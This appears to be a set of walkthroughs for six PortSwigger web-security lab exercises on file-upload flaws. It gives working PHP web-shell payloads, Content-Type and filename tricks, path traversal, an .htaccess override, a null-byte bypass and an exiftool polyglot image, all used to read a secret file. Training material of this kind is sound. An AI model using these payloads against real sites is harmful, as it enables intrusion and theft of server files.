## [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

 - Log in as wiener:peter with Burp proxy intercepting traffic
 - Navigate to your account page and upload any valid image as an avatar
 - In Burp Proxy > HTTP history, find the GET /files/avatars/<your-image> request and send it to Repeater
 - Create a file named exploit.php locally with the content: <?php echo file_get_contents('/home/carlos/secret'); ?>
 - Upload exploit.php via the avatar upload function — confirm the success message
 - In Burp Repeater, change the path to GET /files/avatars/exploit.php and send the request
 - Copy the secret returned in the response body
 - Submit the secret via the lab banner to solve

## [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

 - Log in as wiener:peter with Burp proxy intercepting traffic
 - Upload a valid image as your avatar, then return to your account page
 - In Burp Proxy > HTTP history, find the GET /files/avatars/<your-image> request and send it to Repeater
 - Create exploit.php locally with: <?php echo file_get_contents('/home/carlos/secret'); ?>
 - Attempt to upload exploit.php directly — note the rejection message stating only image/jpeg or image/png are allowed
 - In HTTP history, find the POST /my-account/avatar upload request and send it to Repeater
 - In that Repeater tab, locate the Content-Type header for the file part in the multipart body and change it from  application/x-php to image/jpeg
 - Send the modified request — confirm the upload success response
 - Switch to the GET /files/avatars/ Repeater tab, change the filename in the path to exploit.php, and send
 - Copy the secret from the response body and submit it via the lab banner


## [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

 - Log in as wiener:peter with Burp proxy intercepting traffic
 - Upload a valid image as your avatar and return to your account page
 - In Burp Proxy > HTTP history, find the GET /files/avatars/<your-image> request and send it to Repeater
 - Create exploit.php locally with: <?php echo file_get_contents('/home/carlos/secret'); ?>
 - Upload exploit.php as your avatar — note it's accepted without complaint
 - In the GET Repeater tab, change the filename in the path to exploit.php and send — note the server returns the PHP as plain text rather than executing it (scripts are blocked in the avatars directory)
 - Find the POST /my-account/avatar upload request in proxy history and send it to Repeater
 - In the POST Repeater tab, find the Content-Disposition header for the file part and change the filename to ../exploit.php — send and note the response says the ../ was stripped
 - URL-encode the slash to obfuscate the traversal: change the filename to ..%2fexploit.php and send again — confirm the response now says avatars/../exploit.php has been uploaded
 - In the browser, return to your account page to trigger the file fetch
 - In proxy history, find the GET /files/avatars/..%2fexploit.php request — observe that Carlos's secret is returned in the response (alternatively, request GET /files/exploit.php directly in Repeater)
 - Submit the secret via the lab banner to solve

## [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

 - Log in as wiener:peter, upload a valid image as avatar, return to account page
 - In Burp Proxy > HTTP history, find GET /files/avatars/<your-image> and send to Repeater
 - Create exploit.php locally with: <?php echo file_get_contents('/home/carlos/secret'); ?>
 - Attempt to upload exploit.php — confirm .php is blocked; note Apache server in response headers
 - Find POST /my-account/avatar in proxy history and send to Repeater
 - Modify the POST request to upload an .htaccess file:

    - filename → .htaccess
    - Content-Type → text/plain
    - File body → AddType application/x-httpd-php .l33t


 - Send — confirm successful upload
 - In the same tab, update the request to upload the PHP payload:

    - filename → exploit.l33t
    - File body → <?php echo file_get_contents('/home/carlos/secret'); ?>


 - Send — confirm successful upload
 - In the GET Repeater tab, change the path to /files/avatars/exploit.l33t and send — copy the secret from the response
 - Submit the secret via the lab banner to solve



## [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

 - Log in as wiener:peter, upload a valid image as avatar, return to account page
 - In Burp Proxy > HTTP history, find GET /files/avatars/<your-image> and send to Repeater
 - Create exploit.php locally with: <?php echo file_get_contents('/home/carlos/secret'); ?>
 - Attempt to upload exploit.php — confirm only JPG and PNG are allowed
 - Find POST /my-account/avatar in proxy history and send to Repeater
 - In the POST Repeater tab, find the Content-Disposition header for the file part and change the filename to exploit.php%00.jpg (URL-encoded null byte before the .jpg)
 - Send — confirm the response refers to the file as exploit.php, indicating the null byte and .jpg suffix were stripped
 - In the GET Repeater tab, change the path to /files/avatars/exploit.php and send — copy the secret from the response
 - Submit the secret via the lab banner to solve


## [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)


 - Log in as wiener:peter, attempt to upload a plain exploit.php as avatar — confirm the server blocks non-genuine images
 - Install ExifTool on your Linux machine:
sudo apt install libimage-exiftool-perl
 - Download a valid JPEG to use as the base image:
curl -o image.jpg https://via.placeholder.com/150
 - Embed the PHP payload into the image metadata and save as polyglot.php:
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
 - Verify the payload was embedded correctly:
exiftool polyglot.php | grep Comment
 - Upload polyglot.php as your avatar in the browser — confirm it's accepted
 - Return to your account page to trigger the avatar fetch
 - In Burp Proxy > HTTP history, find the GET /files/avatars/polyglot.php request
 - In the response, use the message editor's search to find START within the binary data — copy the secret between START and END
 - Submit the secret via the lab banner to solve

 